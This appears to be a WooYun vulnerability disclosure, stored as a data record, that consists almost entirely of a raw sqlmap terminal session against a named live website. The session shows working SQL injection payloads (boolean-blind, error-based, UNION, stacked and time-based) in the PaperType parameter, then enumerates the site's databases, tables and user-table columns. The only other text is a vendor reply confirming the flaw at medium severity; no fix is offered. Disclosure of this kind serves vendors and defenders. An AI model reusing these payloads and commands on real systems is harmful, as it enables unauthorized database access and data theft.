HTTP(s) requests:---Place: GETParameter: PaperType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: PaperType=ftp' AND 4538=4538 AND 'jiDQ'='jiDQ    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: PaperType=ftp' AND 1823=CONVERT(INT,(SELECT CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+(SELECT (CASE WHEN (1823=1823) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113))) AND 'saxJ'='saxJ    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: PaperType=-7560' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+CHAR(88)+CHAR(110)+CHAR(83)+CHAR(73)+CHAR(120)+CHAR(117)+CHAR(66)+CHAR(121)+CHAR(65)+CHAR(88)+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113),NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: PaperType=ftp'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: PaperType=ftp' AND 2824=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'Tlct'='Tlct---[13:42:24] [INFO] testing Microsoft SQL Server[13:42:24] [INFO] confirming Microsoft SQL Server[13:42:25] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[13:42:25] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 19 times[13:42:25] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/kfq.lcxw.cn'[*] shutting down at 13:42:25root@root:~# sqlmap -u http://kfq.lcxw.cn/shuzibao/list.asp?PaperType=ftp --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:42:27[13:42:27] [INFO] resuming back-end DBMS 'microsoft sql server' [13:42:27] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: PaperType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: PaperType=ftp' AND 4538=4538 AND 'jiDQ'='jiDQ    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: PaperType=ftp' AND 1823=CONVERT(INT,(SELECT CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+(SELECT (CASE WHEN (1823=1823) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113))) AND 'saxJ'='saxJ    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: PaperType=-7560' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+CHAR(88)+CHAR(110)+CHAR(83)+CHAR(73)+CHAR(120)+CHAR(117)+CHAR(66)+CHAR(121)+CHAR(65)+CHAR(88)+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113),NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: PaperType=ftp'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: PaperType=ftp' AND 2824=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'Tlct'='Tlct---[13:42:28] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[13:42:28] [INFO] fetching database names[13:42:28] [WARNING] reflective value(s) found and filtering out[13:42:28] [INFO] the SQL query used returns 10 entries[13:42:28] [INFO] retrieved: \"epaper\"[13:42:28] [INFO] retrieved: \"kfqepaper\"[13:42:28] [INFO] retrieved: \"master\"[13:42:28] [INFO] retrieved: \"model\"[13:42:29] [INFO] retrieved: \"msdb\"[13:42:29] [INFO] retrieved: \"Northwind\"[13:42:29] [INFO] retrieved: \"pubs\"[13:42:29] [INFO] retrieved: \"tempdb\"[13:42:29] [INFO] retrieved: \"xjz_2\"[13:42:29] [INFO] retrieved: \"xjz_2\"available databases [9]:                                                       [*] epaper[*] kfqepaper[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] tempdb[*] xjz_2[13:42:29] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/kfq.lcxw.cn'[*] shutting down at 13:42:29root@root:~# sqlmap -u http://kfq.lcxw.cn/shuzibao/list.asp?PaperType=ftp --current-db    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:42:34[13:42:35] [INFO] resuming back-end DBMS 'microsoft sql server' [13:42:35] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: PaperType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: PaperType=ftp' AND 4538=4538 AND 'jiDQ'='jiDQ    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: PaperType=ftp' AND 1823=CONVERT(INT,(SELECT CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+(SELECT (CASE WHEN (1823=1823) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113))) AND 'saxJ'='saxJ    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: PaperType=-7560' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+CHAR(88)+CHAR(110)+CHAR(83)+CHAR(73)+CHAR(120)+CHAR(117)+CHAR(66)+CHAR(121)+CHAR(65)+CHAR(88)+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113),NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: PaperType=ftp'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: PaperType=ftp' AND 2824=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'Tlct'='Tlct---[13:42:35] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[13:42:35] [INFO] fetching current database[13:42:35] [WARNING] reflective value(s) found and filtering outcurrent database:    'kfqepaper'[13:42:35] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/kfq.lcxw.cn'[*] shutting down at 13:42:35root@root:~# sqlmap -u http://kfq.lcxw.cn/shuzibao/list.asp?PaperType=ftp --tables -D kfqepaper    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:42:46[13:42:47] [INFO] resuming back-end DBMS 'microsoft sql server' [13:42:47] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: PaperType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: PaperType=ftp' AND 4538=4538 AND 'jiDQ'='jiDQ    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: PaperType=ftp' AND 1823=CONVERT(INT,(SELECT CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+(SELECT (CASE WHEN (1823=1823) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113))) AND 'saxJ'='saxJ    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: PaperType=-7560' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+CHAR(88)+CHAR(110)+CHAR(83)+CHAR(73)+CHAR(120)+CHAR(117)+CHAR(66)+CHAR(121)+CHAR(65)+CHAR(88)+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113),NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: PaperType=ftp'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: PaperType=ftp' AND 2824=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'Tlct'='Tlct---[13:42:47] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[13:42:47] [INFO] fetching tables for database: kfqepaper[13:42:47] [WARNING] reflective value(s) found and filtering out[13:42:47] [INFO] the SQL query used returns 29 entries[13:42:47] [INFO] retrieved: \"dbo.A_GROUP_FUNC\"[13:42:47] [INFO] retrieved: \"dbo.A_GROUP_TYPE\"[13:42:48] [INFO] retrieved: \"dbo.A_GROUP_USER\"[13:42:48] [INFO] retrieved: \"dbo.A_module\"[13:42:48] [INFO] retrieved: \"dbo.A_PERSON_FUNC\"[13:42:48] [INFO] retrieved: \"dbo.A_PERSON_USER\"[13:42:48] [INFO] retrieved: \"dbo.A_USER_INFO\"[13:42:48] [INFO] retrieved: \"dbo.D_Tmp\"[13:42:49] [INFO] retrieved: \"dbo.D99_CMD\"[13:42:49] [INFO] retrieved: \"dbo.dtproperties\"[13:42:49] [INFO] retrieved: \"dbo.foofoofoo\"[13:42:49] [INFO] retrieved: \"dbo.kill_kk\"[13:42:49] [INFO] retrieved: \"dbo.log\"[13:42:50] [INFO] retrieved: \"dbo.syscommand\"[13:42:50] [INFO] retrieved: \"dbo.sysconstraints\"[13:42:50] [INFO] retrieved: \"dbo.syssegments\"[13:42:50] [INFO] retrieved: \"dbo.tb_article\"[13:42:50] [INFO] retrieved: \"dbo.tb_ClassID_OnLine\"[13:42:51] [INFO] retrieved: \"dbo.tb_investigate_info\"[13:42:51] [INFO] retrieved: \"dbo.tb_investigate_log\"[13:42:51] [INFO] retrieved: \"dbo.tb_investigate_questionList\"[13:42:51] [INFO] retrieved: \"dbo.tb_investigate_result_question\"[13:42:51] [INFO] retrieved: \"dbo.tb_onlineFile\"[13:42:52] [INFO] retrieved: \"dbo.tb_paperBuy\"[13:42:52] [INFO] retrieved: \"dbo.tb_paperBuy\"[13:42:52] [INFO] retrieved: \"dbo.tb_review\"[13:42:52] [INFO] retrieved: \"kfqshizibao.D99_Tmp\"[13:42:52] [INFO] retrieved: \"kfqshizibao.pangolin_test_table\"[13:42:53] [INFO] retrieved: \"kfqshizibao.xl\"Database: kfqepaper                                                            [29 tables]+---------------------------------+| A_GROUP_FUNC                    || A_GROUP_TYPE                    || A_GROUP_USER                    || A_PERSON_FUNC                   || A_PERSON_USER                   || A_USER_INFO                     || A_module                        || D99_CMD                         || D_Tmp                           || dtproperties                    || foofoofoo                       || kill_kk                         || log                             || syscommand                      || sysconstraints                  || syssegments                     || tb_ClassID_OnLine               || tb_article                      || tb_investigate_info             || tb_investigate_log              || tb_investigate_questionList     || tb_investigate_result_question  || tb_onlineFile                   || tb_paperBuy                     || tb_paperBuy                     || tb_review                       || kfqshizibao.D99_Tmp             || kfqshizibao.pangolin_test_table || kfqshizibao.xl                  |+---------------------------------+[13:42:53] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/kfq.lcxw.cn'[*] shutting down at 13:42:53root@root:~# sqlmap -u http://kfq.lcxw.cn/shuzibao/list.asp?PaperType=ftp --columns -T A_GROUP_USER -D kfqepaper    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:43:57[13:43:58] [INFO] resuming back-end DBMS 'microsoft sql server' [13:43:58] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: PaperType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: PaperType=ftp' AND 4538=4538 AND 'jiDQ'='jiDQ    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: PaperType=ftp' AND 1823=CONVERT(INT,(SELECT CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+(SELECT (CASE WHEN (1823=1823) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113))) AND 'saxJ'='saxJ    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: PaperType=-7560' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+CHAR(88)+CHAR(110)+CHAR(83)+CHAR(73)+CHAR(120)+CHAR(117)+CHAR(66)+CHAR(121)+CHAR(65)+CHAR(88)+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113),NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: PaperType=ftp'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: PaperType=ftp' AND 2824=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'Tlct'='Tlct---[13:43:59] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[13:43:59] [INFO] fetching columns for table 'A_GROUP_USER' in database 'kfqepaper'[13:43:59] [WARNING] reflective value(s) found and filtering out[13:43:59] [INFO] the SQL query used returns 4 entries[13:43:59] [INFO] retrieved: \"groupId\",\"int\"[13:43:59] [INFO] retrieved: \"id\",\"int\"[13:44:00] [INFO] retrieved: \"setDate\",\"datetime\"[13:44:00] [INFO] retrieved: \"userid\",\"varchar\"Database: kfqepaper                                                            Table: A_GROUP_USER[4 columns]+---------+----------+| Column  | Type     |+---------+----------+| groupId | int      || id      | int      || setDate | datetime || userid  | varchar  |+---------+----------+[13:44:00] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/kfq.lcxw.cn'[*] shutting down at 13:44:00root@root:~# sqlmap -u http://kfq.lcxw.cn/shuzibao/list.asp?PaperType=ftp --columns -T A_PERSON_USER -D kfqepaper    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:44:40[13:44:40] [INFO] resuming back-end DBMS 'microsoft sql server' [13:44:40] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: PaperType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: PaperType=ftp' AND 4538=4538 AND 'jiDQ'='jiDQ    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: PaperType=ftp' AND 1823=CONVERT(INT,(SELECT CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+(SELECT (CASE WHEN (1823=1823) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113))) AND 'saxJ'='saxJ    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: PaperType=-7560' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+CHAR(88)+CHAR(110)+CHAR(83)+CHAR(73)+CHAR(120)+CHAR(117)+CHAR(66)+CHAR(121)+CHAR(65)+CHAR(88)+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113),NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: PaperType=ftp'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: PaperType=ftp' AND 2824=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'Tlct'='Tlct---[13:44:40] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[13:44:40] [INFO] fetching columns for table 'A_PERSON_USER' in database 'kfqepaper'[13:44:41] [WARNING] reflective value(s) found and filtering out[13:44:41] [INFO] the SQL query used returns 5 entries[13:44:41] [INFO] retrieved: \"fatherid\",\"int\"[13:44:41] [INFO] retrieved: \"groupId\",\"int\"[13:44:41] [INFO] retrieved: \"id\",\"int\"[13:44:41] [INFO] retrieved: \"setDate\",\"datetime\"[13:44:42] [INFO] retrieved: \"userid\",\"varchar\"Database: kfqepaper                                                            Table: A_PERSON_USER[5 columns]+----------+----------+| Column   | Type     |+----------+----------+| fatherid | int      || groupId  | int      || id       | int      || setDate  | datetime || userid   | varchar  |+----------+----------+[13:44:42] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/kfq.lcxw.cn'[*] shutting down at 13:44:42root@root:~#\n   修复方案：  I don't Know?   版权声明：转载请注明来源 SunnyDoll@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-09-14 08:52 厂商回复： 感谢您发现，我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}